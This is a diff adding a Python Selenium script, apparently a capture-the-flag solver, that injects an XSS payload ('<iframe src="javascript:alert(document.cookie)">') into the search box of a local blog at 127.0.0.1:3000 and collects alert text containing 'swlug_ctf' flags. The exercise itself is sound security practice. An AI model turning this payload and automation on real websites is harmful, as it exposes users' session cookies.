@@ -1,0 +1,68 @@
+from selenium import webdriver
+from selenium.webdriver.support.ui import WebDriverWait
+from selenium.webdriver.common.by import By
+from selenium.webdriver.support import expected_conditions as EC
+
+# XSS 페이로드 리스트
+XSS_PAYLOADS = [
+    '<iframe src="javascript:alert(document.cookie)"></iframe>'
+]
+
+options = webdriver.ChromeOptions()
+options.add_argument('--headless=new')  #  창 없이 실행
+options.add_argument('--no-sandbox')
+options.add_argument('--disable-dev-shm-usage')
+options.add_argument('--disable-gpu')
+options.add_argument('--log-level=3')   #  크롬 콘솔 로그 최소화
+
+driver = webdriver.Chrome(options=options)
+
+found_flags = []
+
+try:
+    url = 'http://127.0.0.1:3000/blog'
+    driver.get(url)
+
+    # 검색 입력 필드 찾기 (input, textarea 모두 포함)
+    inputs = WebDriverWait(driver, 10).until(
+        EC.presence_of_all_elements_located((By.CSS_SELECTOR, 'input, textarea'))
+    )
+
+    search_input = None
+    for input_elem in inputs:
+        placeholder = input_elem.get_attribute("placeholder")
+        if placeholder and "검색어를 입력하세요" in placeholder:
+            search_input = input_elem
+            break
+
+    if search_input:
+        for payload in XSS_PAYLOADS:
+            search_input.click()
+            search_input.clear()
+            search_input.send_keys(payload)
+
+            try:
+                search_button = WebDriverWait(driver, 10).until(
+                    EC.element_to_be_clickable((By.XPATH, "//button[contains(text(), '검색')]"))
+                )
+                driver.execute_script("arguments[0].click();", search_button)
+            except:
+                pass
+
+            try:
+                alert = WebDriverWait(driver, 2).until(EC.alert_is_present())
+                alert_text = alert.text
+                alert.accept()
+
+                if "swlug_ctf" in alert_text:
+                    found_flags.append(alert_text)
+
+            except:
+                pass
+
+finally:
+    driver.quit()
+
+# 오직 flag만 출력
+for flag in found_flags:
+    print(flag)
